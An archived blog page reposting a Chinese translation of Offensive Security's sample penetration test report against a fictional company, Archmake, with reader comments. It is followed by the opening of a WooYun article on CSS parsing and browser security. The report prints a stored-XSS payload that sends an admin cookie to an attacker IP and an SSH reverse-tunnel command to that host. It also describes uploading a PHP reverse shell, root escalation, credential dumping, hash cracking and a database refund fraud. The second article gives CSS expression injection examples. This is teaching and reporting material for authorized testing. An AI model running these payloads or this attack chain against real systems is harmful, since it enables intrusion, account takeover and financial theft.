
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>The 89 Page | It so life</title>
<meta name="author" content="RobinChia">

<meta name="description" content="It so life">


<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">


<meta property="og:site_name" content="It so life"/>

<!--[if IE]><style>.testIE.IE{display:inline;}</style><![endif]-->
<!--[if lte IE 7]><link rel="stylesheet" href="/css/ie7.css" type="text/css"><![endif]-->
<!--[if (lt IE 9)&(gt IE 7)]><style>.testIE.IE8{display:inline;}</style><![endif]-->
<!--[if gt IE 8]><style>.testIE.IE9{display:inline;}</style><![endif]-->

<link href="/favicon.png" rel="icon">
<link rel="alternate" href="/atom.xml" title="It so life Feed" type="application/atom+xml">

<link rel="stylesheet" href="http://cdn.staticfile.org/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/font-awesome/4.0.3/css/font-awesome.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/prettify/r298/prettify.min.css" type="text/css">
<link rel="stylesheet" href="http://cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" type="text/css">
<link rel="stylesheet" href="/css/style.css" type="text/css">
<!--[if lt IE 9]>
   <style>article,aside,dialog,footer,header,section,footer,nav,figure,menu{display:block}</style>
   <script src="http://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
   <script src="http://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
<link href="http://cdn.staticfile.org/respond.js/1.4.2/respond-proxy.html" id="respond-proxy" rel="respond-proxy" />
<link href="/js/respond.proxy.gif" id="respond-redirect" rel="respond-redirect" />
<script src="/js/respond.proxy.js"></script>
   <script src="http://cdn.bootcss.com/selectivizr/1.0.2/selectivizr-min.js"></script>
<![endif]-->
<script type="text/javascript">
function loadjs(c,d){var a=document.createElement("script");a.async=!0;a.type="text/javascript";a.src=c;a.charset=d||"gbk";(document.getElementsByTagName("HEAD")[0]||document.getElementsByTagName("BODY")[0]).appendChild(a)};
var _protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
var _js2load = [];
</script>

</head>
<body>
      <header id="header" class="container"><nav id="main-nav" class="navbar navbar-default navbar-fixed-top " role="navigation">
  <div class="container">
    <div class="navbar-header">
    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
      <span class="sr-only">Toggle navigation</span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </button>
    <a class="navbar-brand" href="/">It so life</a>
    </div>
    <div  class="collapse navbar-collapse">
      <ul  class="nav navbar-nav">
  
        <li><a href="/" title="Home">Home</a></li>      
        <li><a href="/about/" title="About">About</a></li>      
        <li><a href="/archives/" title="Archives">Archives</a></li>      
      <li class='dropdown'>
        <a class='dropdown-toggle' data-toggle='dropdown' href='#'>website<b class='caret'></b></a>
        <ul class='dropdown-menu pure-menu-selected'>
    
          <li><a href="//groups.google.com/forum/#!forum/pongba" title="TopLanguage">TopLanguage</a></li>    
          <li><a href="//itpub.net/" title="ITPub">ITPub</a></li>    
          <li><a href="//blog.jobbole.com/" title="Bole">Bole</a></li>    
          <li><a href="//nosql-database.org/" title="nosql">nosql</a></li>    
          <li><a href="//gitimmersion.googol.im/" title="Git">Git</a></li>    
        </ul>
      </li>
    
      </ul>
      <ul class="nav navbar-nav navbar-right">
      
        <li><a href="/atom.xml">RSS</a></li>
      
      
        <li><a href="https://twitter.com/robinchia">twitter</a></li>
      
      
      
      
        <li><a href="https://github.com/robinchia">github</a></li>
      
      </ul>
    </div>
  </div>
</nav>
<div class="clearfix"></div>
</header>
  <div id='content' class="container">
     <div class="page-header-wrapper">
      <!--[if lt IE 9]><div class="alert alert-warning alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button><strong>提示:</strong>您的浏览器版本太低了,建议升级到 <strong><a href="http://windows.microsoft.com/zh-cn/internet-explorer/download-ie" title="IE9">IE9</a></strong> 以上,本站使用<a href="https://www.google.com/intl/zh-CN/chrome/">Chrome浏览器</a>可以获得最好的显示效果.</div><![endif]-->
      <div class="page-header"><h1 align="center"><big>It so life</big> </h1>
        <h5 align="center"><big>love as life</big></h5>
      </div>
     </div>
     <div class="row">
       <div id="main-col" class="alignleft col-sx-12 col-sm-8 col-md-9 col-lg-9">
      <section id='header_widget'></section>
          <div id="wrapper"><article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全--技术解析一份ArchmakeCOM的渗透测试报告-FreebuFCOM/">[技术解析]一份Archmake.COM的渗透测试报告</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全--技术解析一份ArchmakeCOM的渗透测试报告-FreebuFCOM/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="-archmake-com-freebuf-com">[技术解析]一份Archmake.COM的渗透测试报告- FreebuF.COM</h1>
<p><img src="&quot;定义(粉红" alt="">&quot;)<img src="&quot;假设(蓝色" alt="">&quot;)<img src="&quot;分析(黄色" alt="">&quot;)<img src="&quot;结论(橘红" alt="">&quot;)<img src="&quot;优势(绿色" alt="">&quot;)<img src="&quot;缺陷(紫色" alt="">&quot;)<img src="&quot;注意(红色" alt="">&quot;)<img src="&quot;清除背景色&quot;" alt=""><img src="&quot;书签&quot;" alt=""><img src="&quot;设为目录项&quot;" alt=""><img src="&quot;在Google中搜索&quot;" alt=""><img src="&quot;查找解释&quot;" alt=""><img src="&quot;标注&quot;" alt=""><img src="&quot;链接到所选文件夹/标签/样式/文件&quot;" alt=""><img src="&quot;Wiz助手&quot;" alt=""><img src="&quot;稍后阅读(tag" alt="">&quot;)
关于本文作者</p>
<p><img src="" alt="avatar"></p>
<p><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布" target="_blank">litdg</a> (2级)</p>
<p>这家伙很懒，未填个人简介。</p>
<h3 id="-archmake-com-">[技术解析]一份Archmake.COM的渗透测试报告  <img src="&quot;原创精品&quot;" alt=""></h3>
<p><a href=""></a><a href="http://www.freebuf.com/author/litdg" title="由 litdg 发布">litdg</a> @ <a href="http://www.freebuf.com/category/articles/web" title="查看 WEB安全 中的全部文章" target="_blank">WEB安全</a> 2013-09-22 共 <strong>7832</strong> 人围观</p>
<h2 id="-">前言</h2>
<p>这是offensive security发布的一份渗透测试报告样例。offensive security 是backtrack-linux.org、exploit-db.com的缔造者。</p>
<h2 id="-">概述</h2>
<p>Offensive security已经被授权对Archmake的外部网站进行一次渗透测试.测试评估的方式是模拟恶意的攻击者对公司进行目的明确的渗透.在初期的信息搜集阶段,发现Archmake公司仅仅只有一个web网站和一个邮件服务器.可供攻击的目标比较少.</p>
<p>在对网站的安全评估中,发现它安装了一个有漏洞的WordPress插件.成功利用这个漏洞,取得了WordPress的管理权限.然后反弹了一个交互式的shell并成功提到root权限.</p>
<p>获取了网站服务器的权限之后,开始对内网进行渗透,经过一番尝试,成功获取到了域管理员的权限.之后对内网进行拓扑分析,发现了内网的公司数据库并成功控制.这个数据库不仅存储了订单信息和客户资料,还保存了交易的相关信息.通过控制这个系统,攻击者可以直接提取现金.</p>
<h2 id="-">测试过程</h2>
<h1 id="wordpress-">WordPress漏洞利用</h1>
<p>在对目标系统进行搜集的时候发现网站采用了wordpress 3.3.1搭建.我们在对WordPress进行代码审计的同时,用WPScan扫描了目标网站,发现一个不安全的插件:
./wpscan.rb --url www.Archmake.com --</p>
<p>enumerate p</p>
<hr>
<p>__</p>
<hr>
<hr>
<p>\ \/ / <strong> \ / __</strong>|\ \ /\ / /| |__) | (</p>
<hr>
<hr>
<p>\ \/ \/
/ | <strong><em>/ \</em></strong> \ / <em>_|/ </em>` | &#39;</p>
<p><em> \
\/\ / | |<strong>__) | (</strong>| (</em>| | | | |\/ \/|<em>||<em>__</em></em>/ _<strong>|\</strong>,<em>|</em>| |<em>| v1.1WordPress Security Scanner by ethicalhack3r.co.ukSponsored by the RandomStorm Open Source Initiative<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><em>__</em></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></em>| URL: <a href="http://www.Archmake.com/|" target="_blank">http://www.Archmake.com/|</a> Started on Tue Jan 24 18:44:49 2012[!] The WordPress theme in use is called &quot;twentyeleven&quot;.[!] The WordPress &quot;<a href="http://www.Archmake.com/readme.html" target="_blank">http://www.Archmake.com/readme.html</a>&quot; file exists.[!] WordPress version 3.3.1 identified from meta generator.[+] Enumerating installed plugins...Checking for 2892 total plugins... 100% complete.[+] We found 2 plugins:Name: relevanssiLocation: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/Directory" target="_blank">http://www.Archmake.com/wp-content/plugins/relevanssi/Directory</a> listing enabled? Yes.Name: relevanssiLocation: <a href="http://www.Archmake.com/wp-content/plugins/relevanssi/Directory" target="_blank">http://www.Archmake.com/wp-content/plugins/relevanssi/Directory</a> listing enabled? Yes.[+] There were 1 vulnerabilities identified from the plugin names:[!] Relevanssi 2.7.2 WordPress Plugin Stored XSS Vulnerability/* Reference: <a href="http://www.exploit-db.com/exploits/16233/[+" target="_blank">http://www.exploit-db.com/exploits/16233/[+</a>] Finished at Tue Jan 24 18:45:30 2012</p>
<p>正如WPScan扫描结果展示的一样,这个Relevanssi插件存在一个XSS漏洞.成功利用这个漏洞可以窃取到管理员的cookies.</p>
<p>第一步,我们在Archmake网站的搜索栏中插入如下代码:</p>
<script>new Image().src="http://172.16.40.204/p.php?cookie="+document.cookie; </script>

<p><img src="" alt=""></p>
<p>当WordPress管理员点击后台管理面板上的”User Searches”时,脚本就会执行.</p>
<p><img src="" alt=""></p>
<p>远程攻击者的服务器上就可以接收到管理员的cookie.</p>
<p>GET/p.php?cookie=wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588%7C72c3335ad1e783b75bb3d8cf9e85fc9c;%20wp-settings-time-1=1327925790;%20wordpress_test_cookie=WP+Cookie+check;%20wordpress</p>
<p>_logged_i
n_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1328098588%7Caf1bcabca49191de76ec45e798ae5ada;%20wp-settings-1=editor%3Dhtml;%20wordpress_ed8a4e5dd813c7b5d262130b08955a6a=admin%7C1327599469%7C3ada64cf8e918c9a4bf148896181fc63;%20wordpress_logged_in_ed8a4e5dd813c7b5d262130b08955a6a=admin HTTP/1.1</p>
<p>然后使用firefox的cookie编辑器,修改cookie.这样就可以绕过WordPress的登录功能,获得一个管理员会话.</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p>获取到后台管理员权限之后,整站的权限就有很多种方法可以得到了.最直接的就是修改WordPress的主题文件.</p>
<h1 id="wordpress-">WordPress插件任意文件类型上传</h1>
<p>取得WordPress系统的权限了,接下来可以白盒审计一下,看看是否有其他的漏洞可能被攻击者利用.这里我们审计了WordPress安装的插件.</p>
<p>审计插件的时候发现一个可以允许用户上传头像的插件.</p>
<p><img src="" alt=""></p>
<p>通过对这个插件的源码进行审计,发现它是通过一个正则表达式来控制上传文件的类型的.</p>
<p><img src="" alt=""></p>
<p>上面这段用来检查上传文件的代码是存在缺陷的.这个正则对字符串进行了一次简单的过滤,而且这是唯一的一个检测文件类型的手段.它的本意是只允许像”Myimage.png”这样的文件名.但是像”Myimage.png.php”这样的文件名也可以成功通过正则的检测,上传到服务器上.</p>
<p>虽然将后续攻击上传到服务器上有很多方法(前面提到过,比如修改主题).但是我们决定采用这个漏洞来上传.一是可以验证一个新的漏洞,二是这样子对服务器所做的更改最小化.</p>
<p><img src="" alt=""></p>
<p>为了验证这个上传过程确实跟我们分析的一样,先上传了一个标准的图像文件作为测试.然后上传了一个配置好的反弹shell的php脚本.</p>
<p>执行这个脚本,在攻击者控制的远程服务器上可以获得一个交互式的shell环境.因为这个shell是以webserver的权限的运行的,所以它只有很低的权限.</p>
<p><img src="" alt=""></p>
<h1 id="linux-">Linux本地权限提升</h1>
<p>获得了目标网站服务器的交互式shell之后,下一个目标自然是获得系统的root权限了.</p>
<p>目标系统的相关信息如下: Linux version 2.6.32-5-686 (Debian 2.6.32-38) (ben@decadent.org.uk) (gcc version 4.3.5 (Debian 4.3.5-4) ) /#1 SMP Mon Oct 3 04:15:24 UTC 2011</p>
<p>经过一番资料搜索和测试,发现这个系统存在一个race condition的缺陷.先是通过上传头像的插件上传了利用代码.</p>
<p><img src="" alt=""></p>
<p>解压,加执行权限,执行利用程序,成功获得root权限.</p>
<p><img src="" alt=""></p>
<p>现在,这个网站服务器已经可以作为一个恶意攻击者进行内网渗透的跳板了.如果这是一次真实的攻击,那么这台网站服务器上的任何数据都已经不可信了,因为攻击者可以随意修改控制.</p>
<h1 id="-">长期驻守服务器</h1>
<p>获得了服务器的管理权限之后,就需要维护一个更加稳定的连接来进行后续的渗透.</p>
<p>通过对该服务器的检查,发现它的ssh服务运行在22000端口.我们决定使用ssh将内网端口转发出来.这样子既方便,又不会给服务器带来额外的安全风险.</p>
<p>为了把对系统的变更降到最低,我们既没有添加账户,也没有修改账户口令.而是采用了SSH 基于密钥的认证方式.</p>
<p>之前提到过.我们自己控制的SSH服务器,ssh开在53端口.通过执行以下命令,将网站服务器的22000端口转发出来.</p>
<p>ssh -o &#39;StrictHostKeyChecking no&#39; -R 22000:127.0.0.1:22000 -p 53 172.16.40.204 ping 127.0.0.1</p>
<p><img src="" alt=""></p>
<p>此外还需要创建一个SOCKS代理,这样攻击者就可以通过这个代理来访问目标网络里的服务.</p>
<p><img src="" alt=""></p>
<h2 id="-splunk">存在漏洞的splunk</h2>
<p>当分析已经控制的网站服务器配置的时候发现一个内网网段10.10.0.x.对这个内网网段进行扫描分析,我们发现了一台splunk服务器.</p>
<p>splunk 低于4.2.5的版本存在一个高危的远程命令执行漏洞.通过前面介绍的SOCKS代理,我们访问到了Splunk的web界面.证实了它的版本是4.2.2</p>
<p><img src="" alt=""></p>
<p>在windows上splunk一般都是以SYSTEM权限运行的.所以我们可以直接添加一个管理员用户.</p>
<p><img src="" alt=""></p>
<p>这个命令执行漏洞是没有回显的,只能通过登录远程桌面来验证命令是否执行成功.</p>
<p><img src="" alt=""></p>
<p>现在我们又控制了内网一台win服务器.</p>
<h2 id="-">获得域管理权限</h2>
<p>内网渗透,而且是windows主机.下一步一般就是要获取域管理员的权限了.我们把WCE(Windows Credential Editor)上传到splunk服务器上.WCE可以从内存中读取认证信息,然后利用这些认证信息来做一些有用的事情.</p>
<p>在splunk服务器上执行wce.exe,成功从内存中获取到了域管理员的token.</p>
<p><img src="" alt=""></p>
<p>有了这些认证信息,就可以很容易的获取一个域管理员权限的shell.</p>
<p><img src="" alt=""></p>
<p>然后利用这个shell运行终端管理(Microsoft Management Console).攻击者就或得了域的控制权限.</p>
<p><img src="" alt=""></p>
<h2 id="-">数据库数据利用</h2>
<p>控制splunk服务器之后,在它的本地文件系统中发现了一个csv文件.</p>
<p><img src="" alt=""></p>
<p>分析发现这是一个从数据库中导出的客户信息的文件.</p>
<p><img src="" alt="1"></p>
<p>很显然,应该是exportcsv.exe这个程序导出的数据库信息.用OD对这个程序进行了分析,发现它直连了一个MS SQL server.连接的认证信息直接编码在了程序里面.</p>
<p><img src="" alt=""></p>
<p>利用获取到的认证信息可以直连到数据库,从而获得了控制这个数据库所有数据的权限.</p>
<p><img src="" alt=""></p>
<p><img src="" alt=""></p>
<p>导出数据库的数据进行分析.发现了大量客户的信息,包括用户ID,姓名,邮件,电话,加密的密码和其他信息.</p>
<p><img src="" alt=""></p>
<p>密码是用md5加密的.将这些hash导入我们维护的密码破解器进行破解.一共导入了1000个hash,22秒后,成功破解了996个.(话外音:这是什么节奏啊….)</p>
<p><img src="" alt=""></p>
<h2 id="-archmake-">控制Archmake的交易</h2>
<p>在对数据库进行深入分析的时候我们注意到有很多表的内容会定期更新.通过对这些表的监控和分析发现,原来这是跟订单有关的表.这些订单的信息会定期的更新到数据库里.一段时间以后,会根据”Category”字段的不同进行不同的处理.</p>
<p><img src="" alt=""></p>
<p>经过对数据库监控和在数据库中添加一些测试数据,最后总结除了Categories字段的含义:</p>
<p><img src="" alt=""></p>
<p>交易的类型一确定,相关的信息就会插入到这个表里.我们发现如果插入一个有效的用户ID,用户信息卡信息填攻击者自己控制的信用卡,交易类型选4(4是退款).就可以退任意数额的钱到攻击者的信用卡账户了.这个已经在可控的环境下被证实了.</p>
<p><a href="http://www.offensive-security.com/penetration-testing-sample-report.pdf" target="_blank">原文下载</a>
9 0您已评价！</p>
<h3 id="-freebuf-com-http-www-freebuf-com-"><img src="" alt=""> <strong>如文中未特别声明转载请注明出自:</strong> <a href="http://www.freebuf.com/" target="_blank">FreebuF.COM</a></h3>
<p><img src="" alt=""><a href="&quot;累计分享10次&quot;">10</a>
<img src="&quot;Favorite&quot;" alt="Favorite"><img src="&quot;Loading&quot;" alt="Loading"><a href="http://www.freebuf.com/articles/web/?wpfpaction=add&amp;postid=12632" title="收藏该文" target="_blank">收藏该文</a></p>
<h3 id="-">相关文章</h3>
<ul>
<li><a href="http://www.freebuf.com/articles/web/12632.html" target="_blank">[技术解析]一份Archmake.COM的渗透测试报告</a></li>
</ul>
<p><strong>20</strong>条评论 <strong>7834</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/web/12133.html" target="_blank">如何攻击WEB应用程序（连载一）</a></li>
</ul>
<p><strong>25</strong>条评论 <strong>11370</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/web/10307.html" target="_blank">XSS解决方案系列之三: 例解过后，再回首您正在维护的产品</a></li>
</ul>
<p><strong>30</strong>条评论 <strong>7264</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/articles/web/7793.html" target="_blank">一种针对网络图片功能的攻击方式</a></li>
</ul>
<p><strong>22</strong>条评论 <strong>11394</strong>人已围观</p>
<ul>
<li><a href="http://www.freebuf.com/news/8046.html" target="_blank">白帽大胜入侵者——一场经典的DDoS攻防战</a></li>
</ul>
<p><strong>11</strong>条评论 <strong>11174</strong>人已围观
﻿</p>
<h2 id="20-comments-">20 Comments <a href="">发表评论</a></h2>
<ol>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/litdg" target="_blank">litdg</a> (2级) 我很懒。。。<a href=""></a> 2013-09-22  1楼</li>
</ol>
<p>图怎么没了。。。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15891#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/mmtt" target="_blank">mmtt</a> (1级) <a href=""></a> 2013-09-22  2楼</li>
</ol>
<p><img src="" alt=":mrgreen:">  图挂了
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15892#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt="">Helen<a href=""></a> 2013-09-22  3楼</li>
</ol>
<p>8错
<img src="" alt=":grin:">
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15893#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/MeirLin" target="_blank">MeirLin</a> (1级) <a href=""></a> 2013-09-22  4楼</li>
</ol>
<p>Mark</p>
<p>等下班仔细浏览 ..
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15895#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/hang333" target="_blank">hang333</a> (1级) <a href=""></a> 2013-09-22  5楼</li>
</ol>
<p>话说这个收藏起来了.
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15901#respond" target="_blank">回复</a></p>
<ol>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/hcwill" target="_blank">hcwill</a> (1级) <a href=""></a> 2013-09-22  6楼</li>
</ol>
<p>wordpress cookies不是有httponly么？还绕过？
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15903#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/litdg" target="_blank">litdg</a> (2级) 我很懒。。。<a href=""></a> 2013-09-22</li>
</ul>
<p>@hcwill   这个我也没了解过。原文没有提到httponly的问题。WordPress version 3.3.1 identified from meta generator.
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15907#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt="">base<a href=""></a> 2013-09-22  7楼</li>
</ul>
<p>好深奥，学习了
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15908#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt="">XXOO<a href=""></a> 2013-09-22  8楼</li>
</ul>
<p>一共导入了1000个hash,22秒后,成功破解了996个。  我去～
<a href="">亮了</a>(5)
<a href="http://www.freebuf.com/articles/web/?replytocom=15909#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/菊花疼" target="_blank">菊花疼</a> (1级) <a href=""></a> 2013-09-22  9楼</li>
</ul>
<p>菊花再一次胀了
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15915#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/0xTback" target="_blank">0xTback</a> (1级) <a href=""></a> 2013-09-22  10楼</li>
</ul>
<p>求更新图片链接~！！！
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15917#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/litdg" target="_blank">litdg</a> (2级) 我很懒。。。<a href=""></a> 2013-09-22</li>
</ul>
<p>@0xTback   图片已经ok了。打不开的话建议过段时间刷新。可能是fb一直被攻击的关系。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15918#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/thanks" target="_blank">thanks</a><img src="&quot;FB达人&quot;" alt=""> (6级) 支付宝安全工程师<a href=""></a> 2013-09-22</li>
</ul>
<p>@0xTback   图片应该没问题了，强制刷新试试。
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15919#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/corrinetang" target="_blank">corrinetang</a> (1级) <a href=""></a> 2013-09-22  11楼</li>
</ul>
<p>图片很正常，内容很丰富！
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15921#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/tshko0o" target="_blank">tshko0o</a> (1级) 关注信息安全，偶尔愤青一下！~<a href=""></a> 2013-09-22  12楼</li>
</ul>
<p>CVS 貌似有意思
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15922#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/litdg" target="_blank">litdg</a> (2级) 我很懒。。。<a href=""></a> 2013-09-22  13楼</li>
</ul>
<p>每次重读都会发现一些错别字。。。拉低了额fb的文化水平啊
<a href="">亮了</a>(2)
<a href="http://www.freebuf.com/articles/web/?replytocom=15925#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/netorgcom" target="_blank">netorgcom</a> (1级) <a href=""></a> 2013-09-23  14楼</li>
</ul>
<p>pdf附件貌似损坏的~~~
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15978#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/corrinetang" target="_blank">corrinetang</a> (1级) <a href=""></a> 2013-09-23  15楼</li>
</ul>
<p>pdf挺好的啊
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=15995#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/softbug" target="_blank">softbug</a> (4级) 用软件解放大家的双手，希望大家都可以使用自己开发的软件。<a href=""></a> 2013-09-23  16楼</li>
</ul>
<p>能再看到这种细嚼慢咽的分析文章，顿时觉得很爽，很知足。谢谢！
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=16006#respond" target="_blank">回复</a></p>
<ul>
<li><img src="" alt=""><a href="http://www.freebuf.com/author/李开复" target="_blank">李开复</a> (1级) <a href=""></a> 2013-09-24  17楼</li>
</ul>
<p>好淫荡的思路
<a href="">亮了</a>(0)
<a href="http://www.freebuf.com/articles/web/?replytocom=16082#respond" target="_blank">回复</a></p>

      
    </div>
    
    
      
    
    
        <footer id="post-meta">
        <span class="categories">Posted in<span class="breadcrumb fa fa-folder"><li><a href="/categories/安全/">安全</a></li></span></span> | <span class="tags">Tagged <a href="/tags/安全/" class="label label-primary">安全</a></span> | <span class="time">recent updated:<time title="2014-03-07 09:54:39"datetime="2014-03-07 09:54:39"> mar. 7 2014</time></span> | <span class="comment-link">
<a href="http://itsolife.com/2014/02/02/2014-02-02-安全--技术解析一份ArchmakeCOM的渗透测试报告-FreebuFCOM/#comments" class="ds-thread-count comment-link" data-thread-key="2014-02-02-安全--技术解析一份ArchmakeCOM的渗透测试报告-FreebuFCOM" data-count-type="comments">暂无评论</a></span>
        </footer>
    
    <div class="clearfix"></div>
  </div>
</div>
</article>



  <article>
<div id="post" class="post well">
  <div class="post-content">
    <header class="well-sm">
      <i class="fa icon fa-5x pull-left"></i>
      <h1 class="title"><a href="/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/">Browser Security</a></h1>
      
        <span>Posted on<time datetime="2014-02-02T01:54:39.000Z"> <a href="/2014/02/02/2014-02-02-安全-Scripts--BrowserSecurity-css、javascript/">feb. 2 2014</a></time></span>      
    </header>
    
    
    <div class="entry">
      
        <h1 id="browser-security-css-javascript">Browser Security-css、javascript</h1>
<h3 id="-">分享到</h3>
<ul>
<li><a href="">一键分享</a></li>
<li><a href="">QQ空间</a></li>
<li><a href="">新浪微博</a></li>
<li><a href="">百度云收藏</a></li>
<li><a href="">人人网</a></li>
<li><a href="">腾讯微博</a></li>
<li><a href="">百度相册</a></li>
<li><a href="">开心网</a></li>
<li><a href="">腾讯朋友</a></li>
<li><a href="">百度贴吧</a></li>
<li><a href="">豆瓣网</a></li>
<li><a href="">搜狐微博</a></li>
<li><a href="">百度新首页</a></li>
<li><a href="">QQ好友</a></li>
<li><a href="">和讯微博</a></li>
<li><a href="">更多...</a></li>
</ul>
<p><a href="">百度分享</a></p>
<h1 id="-wooyun-http-drops-wooyun-org-wooyun-"><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">WooYun知识库</a></h1>
<p><a href="http://drops.wooyun.org/login" title="登录" target="_blank">登录</a></p>
<p>像一朵乌云一样成长</p>
<ul>
<li><a href="http://drops.wooyun.org/" title="WooYun知识库" target="_blank">首页</a></li>
<li><a href="http://www.wooyun.org/" target="_blank">WooYun</a></li>
<li><a href="http://zone.wooyun.org/" target="_blank">Zone</a></li>
<li><a href="http://drops.wooyun.org/newsend" target="_blank">投稿</a>
<a href="http://drops.wooyun.org/" title="首页" target="_blank">首页</a> » <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a> » Browser Security-css、javascript</li>
</ul>
<h2 id="-browser-security-css-javascript-http-drops-wooyun-org-tips-150-permanent-link-to-browser-security-css-javascript-"><a href="http://drops.wooyun.org/tips/150" title="Permanent Link to Browser Security-css、javascript" target="_blank">Browser Security-css、javascript</a></h2>
<p>0人收藏 <a href="">收藏</a></p>
<p>2013/06/19 18:55  | <a href="http://drops.wooyun.org/author/瞌睡龙" title="由 瞌睡龙 发布" target="_blank">瞌睡龙</a>  | <a href="http://drops.wooyun.org/category/tips" title="查看 技术分享 中的全部文章" target="_blank">技术分享</a>  | <a href="">占个座先</a></p>
<h3 id="-css-">层叠样式表（css）</h3>
<p>调用方式有三种：
1 用<style> 2 通过<link rel=stylesheet>，或者使用style参数。 3 XML（包括XHTML）可以通过&lt;?xml-stylesheet href=...?&gt;</p>
<p>浏览器进行解析的时候会先HTML解析再做CSS解析，所以下面的代码会出错：</p>
<style> some_descriptor { background: url('http://www.example.com/</style><h1 > Gotcha!'); } </style>

<p>字符编码：</p>
<p>为了保证在css中可以使用可能产生问题的字符，css提供了一种方式由反斜杠()加六位十六进制数字。</p>
<p>字符e可以编码成\65 \065 \000065，当后面紧跟的字符也是十六进制字符中的一种的时候，只有最后一个才是对的。</p>
<p>例如teak编码成 t\65ak 不会正常，因为会解码时会把\65a当成一个字符。</p>
<p>为了避免上述情况可以编码以后加一个空白符，例如：t\65 k。</p>
<p>很多CSS解析器同样会解析引号之外的字符串。</p>
<p>下面两个代码IE下相同</p>
<p><A STYLE='color: expression\028 alert \028 1 \029 \029'> <A STYLE='color: expression(alert(1))'></p>
<h3 id="fuzzing">Fuzzing</h3>
<p>CSS的解析规则与HTML和JavaScript在几个方面不同。</p>
<p>JavaScript在语法错误的时候，整个代码都会被忽略，而CSS解析错误时，浏览器尝试忽略错误的代码。</p>
<p>这点上跟HTML比较类似，因为HTML语法错误时，浏览器会尝试修复并展现出来，</p>
<p>@符号用来在CSS样式表中定义一个特殊属性，定义字符集（@charset）或者media的样式（@media）。</p>
